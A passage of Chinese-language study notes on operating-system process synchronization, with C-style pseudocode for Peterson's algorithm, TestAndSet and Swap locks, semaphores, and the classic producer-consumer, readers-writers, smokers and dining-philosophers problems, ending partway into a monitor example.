operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>turn<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token keyword">while</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span>turn<span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>critical section<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>flag<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>remainder section<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token comment">//p2 进程</span></pre></td></tr><tr><td data-num="11"></td><td><pre>flag<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">true</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>turn<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> </pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">while</span><span class="token punctuation">(</span>flag<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&amp;&amp;</span>turn<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>critical section<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>flag<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token boolean">false</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>remainder section<span class="token punctuation">;</span></pre></td></tr></table></figure><p>遵循空闲让进、忙则等待、有限等待三个原则</p><p>但是未遵循让权等待的原则</p><h2 id="四种进程互斥软件实现方法总结"><a class="markdownIt-Anchor" href="#四种进程互斥软件实现方法总结">#</a> 四种进程互斥软件实现方法总结</h2><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230726160621241.png" alt="image-20230726160621241"></p><h3 id="23_3-进程互斥的硬件实现方法"><a class="markdownIt-Anchor" href="#23_3-进程互斥的硬件实现方法">#</a> 2.3_3 进程互斥的硬件实现方法</h3><p>1、中断屏蔽方法</p><p>关中断（不允许进程中断）</p><p>临界区</p><p>开中断</p><p>简单、高校</p><p>多处理机，可能会同时访问临界资源</p><p>使用 OS 内核进程</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230726162745309.png" alt="image-20230726162745309"></p><p>2、TestAndSet（TSL 指令）</p><p>TSL 是用硬件实现的，上锁、检查一气呵成</p><p>不满足让权等待，会盲等</p><p>C 语言描述逻辑：</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 布尔型共享变量 10ck 表示当前临界区是否被加锁</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token comment">//true 表示已加锁，false 表示未加锁</span></pre></td></tr><tr><td data-num="3"></td><td><pre>bool <span class="token function">TestAndSet</span><span class="token punctuation">(</span>bool <span class="token operator">*</span>lock<span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    bool old<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    old<span class="token operator">=</span><span class="token operator">*</span>lock<span class="token punctuation">;</span><span class="token comment">//old 用来存放 Lock 原来的值</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token operator">*</span>lock<span class="token operator">=</span>true<span class="token punctuation">;</span><span class="token comment">// 无论之前是否已加锁，都将 1ock 设为 true</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">return</span> old<span class="token punctuation">;</span><span class="token comment">// 返回 Lock 原来的值</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token comment">// 以下是使用 TSL 指令实现互斥的算法逻辑</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">while</span><span class="token punctuation">(</span><span class="token function">TestAndSet</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>lock<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 上锁并检查</span></pre></td></tr><tr><td data-num="12"></td><td><pre>临界区代码段</pre></td></tr><tr><td data-num="13"></td><td><pre>lock<span class="token operator">=</span>false<span class="token punctuation">;</span> <span class="token comment">// 解锁</span></pre></td></tr><tr><td data-num="14"></td><td><pre></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token number">12345678910111213</span></pre></td></tr></table></figure><p>3、Swap 指令</p><p>别称：Exchange 指令、XCHG 指令</p><p>Swap 指令是用硬件实现的</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">//true 表示已经上锁</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">void</span> <span class="token function">Swap</span><span class="token punctuation">(</span>bool <span class="token operator">*</span>a<span class="token punctuation">,</span>bool <span class="token operator">*</span>b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    bool temp<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    temp<span class="token operator">=</span><span class="token operator">*</span>a<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    <span class="token operator">*</span>a<span class="token operator">=</span><span class="token operator">*</span>b<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    <span class="token operator">*</span>b<span class="token operator">=</span>temp<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="8"></td><td><pre></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token comment">// 以下是使用 Swap 指令实现互斥的算法逻辑</span></pre></td></tr><tr><td data-num="10"></td><td><pre>bool old<span class="token operator">=</span>true<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">while</span><span class="token punctuation">(</span>old<span class="token operator">=</span>true<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token function">Swap</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>lock<span class="token punctuation">,</span><span class="token operator">&amp;</span>old<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>临界区代码段</pre></td></tr><tr><td data-num="14"></td><td><pre>lock<span class="token operator">=</span>false<span class="token punctuation">;</span> <span class="token comment">// 解锁</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token comment">// 剩余代码段</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token number">123456789101112131415</span></pre></td></tr></table></figure><p>简单</p><p>适用多处理机</p><p>不能让权等待</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230726163538687.png" alt="image-20230726163538687"></p><h3 id="23_4-信号量机制"><a class="markdownIt-Anchor" href="#23_4-信号量机制">#</a> 2.3_4 信号量机制</h3><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230726180939994.png" alt="image-20230726180939994"></p><p>信号量：</p><p>信号量是一种变量，表示系统中某种资源的数量</p><p>一对原语：wait（S）原语和 signal（S）原语，分别简称 P（S）、V（S）</p><p>1、整形信号量</p><p>用一个整数表示系统资源的变量，用来表示系统中某种资源的数量</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">int</span> S<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">void</span> <span class="token function">wait</span><span class="token punctuation">(</span><span class="token keyword">int</span> S<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//wait 原语，相当于：进入区</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">while</span><span class="token punctuation">(</span>S<span class="token operator">&lt;=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 如果资源数不够，就意志循环等待</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    S<span class="token operator">=</span>S<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>        <span class="token comment">// 如果资源数够，则占用一个资源</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="6"></td><td><pre></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">void</span> <span class="token function">signal</span><span class="token punctuation">(</span><span class="token keyword">int</span> S<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token comment">//signal 原语，相当于 “退出区”</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    S<span class="token operator">=</span>S<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>         <span class="token comment">// 使用完资源后，在退出区释放资源</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>可能会出现盲等</p><p>2、记录型信号量</p><p>记录型数据结构表示的信号量</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token comment">// 记录型信号量的定义</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">typedef</span> <span class="token keyword">struct</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">int</span> value<span class="token punctuation">;</span><span class="token comment">// 剩余资源数</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">struct</span> <span class="token class-name">process</span> <span class="token operator">*</span>L<span class="token punctuation">;</span><span class="token comment">// 等待队列</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token punctuation">&#125;</span> semaphore<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token comment">// 某进程需要使用资源时，通过 wait 原语申请</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token keyword">void</span> <span class="token function">wait</span> <span class="token punctuation">(</span>semaphore S<span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    S<span class="token punctuation">.</span>value<span class="token operator">--</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span>S<span class="token punctuation">.</span>value<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token function">block</span> <span class="token punctuation">(</span>S<span class="token punctuation">.</span>L<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 将该进程加入到消息队列中，进行自我阻塞</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token comment">// 进程使用完资源后，通过 signal 原语释放</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token keyword">void</span> <span class="token function">signal</span> <span class="token punctuation">(</span>semaphore S<span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    S<span class="token punctuation">.</span>value<span class="token operator">++</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>    <span class="token keyword">if</span><span class="token punctuation">(</span>S<span class="token punctuation">.</span>value<span class="token operator">&lt;=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token function">wakeup</span><span class="token punctuation">(</span>S<span class="token punctuation">.</span>L<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><p>除非特别说明，否则默认 S 为记录型信号量</p><h2 id="信号量机制总结"><a class="markdownIt-Anchor" href="#信号量机制总结">#</a> 信号量机制总结</h2><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230726184336295.png" alt="image-20230726184336295"></p><h3 id="23_5-用信号量机制实现进程互斥-同步-前驱关系"><a class="markdownIt-Anchor" href="#23_5-用信号量机制实现进程互斥-同步-前驱关系">#</a> 2.3_5 用信号量机制实现进程互斥、同步、前驱关系</h3><p>1、实现进程互斥</p><p>设置互斥信号量 mutex，初值为 1</p><p>对不同的临界资源需要设置不同的互斥信号量</p><p>PV 必须成对出现</p><p>2、实现进程同步</p><p>保证一前一后的操作顺序</p><p>设置同步信号量 S，初始为 0</p><p>在 “前操作” 之后执行 V（S）</p><p>在 “后操作” 之后执行 P (S）</p><p>3、实现进程的前驱关系</p><p>1、要为每一对前驱关系各设置一个同步变量</p><p>2、在 “前操作” 之后对相应的同步变量执行 V 操作</p><p>3、在 “后操作” 之前对相应的同步变量执行 P 操作</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/e03e2a2147ac136fc5b50074b89844e8.png" alt="img"></p><h2 id="信号量机制实现进程互斥-同步-前驱关系总结"><a class="markdownIt-Anchor" href="#信号量机制实现进程互斥-同步-前驱关系总结">#</a> 信号量机制实现进程互斥 同步 前驱关系总结</h2><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230726215527536.png" alt="image-20230726215527536"></p><h3 id="23_6-生产者-消费者问题"><a class="markdownIt-Anchor" href="#23_6-生产者-消费者问题">#</a> 2.3_6 生产者 - 消费者问题</h3><p>（好像很幼稚的逻辑</p><p>只有缓冲区没满时，生产者才能把产品放入缓冲区，否则必须等待</p><p>只有缓冲区不空时，消费者才能从中取出产品，否则必须等待</p><p>缓冲区是临界资源，各个进程互斥访问</p><p>实现互斥的 P 操作要放在实现同步的 P 操作之后，不然会发生死锁</p><p>V 操作不会导致进程发生阻塞的状态，所以可以交换</p><p>使用操作不要放在临界区，不然并发度会降低</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230726222000937.png" alt="image-20230726222000937"></p><h3 id="23_7-多生产者-多消费者模型"><a class="markdownIt-Anchor" href="#23_7-多生产者-多消费者模型">#</a> 2.3_7 多生产者 - 多消费者模型</h3><p>在生产 - 消费者问题中，如果缓冲区大小为 1，那么有可能不需要设置互斥信号量就可以实现互斥访问缓冲区</p><p>分析同步问题是，应该从 “事件” 的角度来考虑</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230727131356061.png" alt="image-20230727131356061"></p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/68b1e50aeeabfa85ad0126a7176deb5c.png" alt="img"></p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230727131411402.png" alt="image-20230727131411402"></p><h3 id="23_8-吸烟者问题"><a class="markdownIt-Anchor" href="#23_8-吸烟者问题">#</a> 2.3_8 吸烟者问题</h3><p>解决 “可以让生产多个产品的单生产者” 问题提供一个思路；</p><p>若一个生产者要生产多种产品（或者说会引发多种前驱事件），那么各个 V 操作应该放在各自对应的 “事件” 发生之后的位置</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230727134326556.png" alt="image-20230727134326556"></p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/40dc9cd7ea6625ed2be56e75b637ec5d.png" alt="img"></p><h3 id="23_9-读者-写者问题"><a class="markdownIt-Anchor" href="#23_9-读者-写者问题">#</a> 2.3_9 读者 - 写者问题</h3><p>1、允许多个读者同时对文件执行读操作</p><p>2、只允许一个写者往文件中写信息</p><p>3、任一写者在完成写操作之前不允许其他读者或写者工作</p><p>4、写者执行写操作前，应让已有的读者和写者全部退出</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>semaphore rw<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">// 用于实现对文件的互斥访问。表示当前是否有进程在访问共享文件</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">int</span> count<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token comment">// 记录当前有几个读进程在访问文件</span></pre></td></tr><tr><td data-num="3"></td><td><pre>semaphore mutex<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token comment">// 用于保证对 count 变量的互斥访问</span></pre></td></tr><tr><td data-num="4"></td><td><pre>semaphore w<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 用于实现 “写优先”</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    </pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token function">writer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        P（w）<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token function">P</span><span class="token punctuation">(</span>rw<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 写之前 “加锁”</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        写文件。。。</pre></td></tr><tr><td data-num="11"></td><td><pre>        V（rw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 写之后 “解锁”</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    <span class="token function">V</span><span class="token punctuation">(</span>w<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token function">reader</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token function">P</span><span class="token punctuation">(</span>w<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token function">P</span><span class="token punctuation">(</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 各读进程互斥访问 count</span></pre></td></tr><tr><td data-num="20"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span>count<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span> </pre></td></tr><tr><td data-num="21"></td><td><pre>            <span class="token function">P</span><span class="token punctuation">(</span>rw<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 第一个读进程的读进程数 + 1</span></pre></td></tr><tr><td data-num="22"></td><td><pre>        count<span class="token operator">++</span><span class="token punctuation">;</span><span class="token comment">// 访问文件的读进程数 + 1</span></pre></td></tr><tr><td data-num="23"></td><td><pre>        <span class="token function">V</span><span class="token punctuation">(</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token function">V</span><span class="token punctuation">(</span>w<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        读文件<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></pre></td></tr><tr><td data-num="26"></td><td><pre>        <span class="token function">P</span><span class="token punctuation">(</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 各读进程互斥访问 count</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        count<span class="token operator">--</span><span class="token punctuation">;</span><span class="token comment">// 访问文件的读进程数 - 1</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span>count<span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>            <span class="token function">V</span><span class="token punctuation">(</span>rw<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 最后一个读进程负责 “解锁”</span></pre></td></tr><tr><td data-num="30"></td><td><pre>        <span class="token function">V</span><span class="token punctuation">(</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="31"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr></table></figure><h3 id="23_10-哲学家进餐问题"><a class="markdownIt-Anchor" href="#23_10-哲学家进餐问题">#</a> 2.3_10 哲学家进餐问题</h3><p>五个人，必须拿左右的筷子才能吃饭</p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230727172610642.png" alt="image-20230727172610642"></p><p><img data-src="https://lcx-1317609581.cos.ap-beijing.myqcloud.com/image-20230727172630279.png" alt="image-20230727172630279"></p><p>避免死锁发生</p><p>解决方案：<br>1、可以对哲学家进程施加一些限制条件，比如最多允许四个哲学家同时进餐，这样可以保证至少有一个哲学家是可以拿到左右两只筷子的。</p><p>2、要求奇数号哲学家先拿左边的筷子，然后再拿右边的筷子，而偶数号哲学家刚好相反。用这种方法可以保证如果相邻的两个奇偶号哲学家都想吃饭，那么只会有其中一个可以拿起第一只筷子，另一个会直接阻塞。这就避免了占有一只后再等待另一只的情况。</p><p>3、仅当一个哲学家左右两只筷子都可用时才允许他抓起筷子。</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>semaphore chopstick<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="2"></td><td><pre>semaphore mutex <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>  <span class="token comment">// 互斥地取筷子</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">Pi</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token comment">//i 号哲学家的进程</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token function">P</span><span class="token punctuation">(</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token function">p</span><span class="token punctuation">(</span>chopstick<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token comment">// 拿右</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        <span class="token function">p</span><span class="token punctuation">(</span>chopstick<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 拿左</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token function">V</span><span class="token punctuation">(</span>mutex<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        吃饭<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        <span class="token function">V</span><span class="token punctuation">(</span>chopstick<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>        <span class="token function">V</span><span class="token punctuation">(</span>chopstick<span class="token punctuation">[</span><span class="token punctuation">(</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>        思考<span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></pre></td></tr><tr><td data-num="13"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token number">1234567891011121314</span></pre></td></tr></table></figure><h3 id="23_11-管程"><a class="markdownIt-Anchor" href="#23_11-管程">#</a> 2.3_11 管程</h3><p>1、为什么要引入管程</p><p>PV 操作容易出错、困难</p><p>2、管程的定义和基本特征</p><p>定义：</p><ul><li>局部于管程的共享数据结构说明</li><li>对该数据结构进程操作的一组过程</li><li>对局部于管程的共享数据设置初始值的语句</li><li>管程有一个名字</li></ul><p>基本特征：</p><ul><li>局部于管程数据结构只能被局部于管程的过程所访问</li><li>一个进程只有通过调用管程内的过程才能进入管程访问共享数据</li><li>每次仅允许一个进程在管程内执行某个内部过程</li></ul><p>心得：相当于 C++ 的类，管程是数据放在 private 中，函数放在 public 中</p><p>拓展 1：用管程解决生产者消费者问题</p><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre>monitor producerconsumer</pre></td></tr><tr><td data-num="2"></td><td><pre>    condition full<span class="token punctuation">,</span>empty<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">int</span> count <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token keyword">void</span> <span class="token function">insert</span><span class="token punctuation">(</span>Item item<span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span>count <span class="token operator">==</span> N<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>            <span class="token function">wait</span><span class="token punctuation">(</span>full<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="7"></td><td><pre>        count<span class="token operator">++</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        <span class="token function">insert_item</span> <span class="token punctuation">(</span>item<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="9"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span>count <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="10"></td><td><pre>            <span class="token function">signal</span><span class="token punctuation">(</span>empty<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="12"></td><td><pre>    Item <span class="token function">remove</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="13"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span>count <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="14"></td><td><pre>            <span class="token function">wait</span><span class="token punctuation">(</span>empty<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="15"></td><td><pre>        count<span class="token operator">--</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        <span class="token keyword">if</span><span class="token punctuation">(</span>count <span class="token operator">==</span> N<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre>            <span class="token function">signal</span><span class="token punctuation">(</span>full<span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="18"></td><td><pre>        <span class="token keyword">return</span> <span class="token function">remove_item</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre>    end monitor<span class="token punctuation">;</span></pre></td></tr><tr><td data-num="21"></td><td><pre></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token comment">// 使用</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token function">producer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="24"></td><td><pre>    <span class="token keyword">while</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>        item <span class="token operator">=</span> 生产一个产品<span class="token 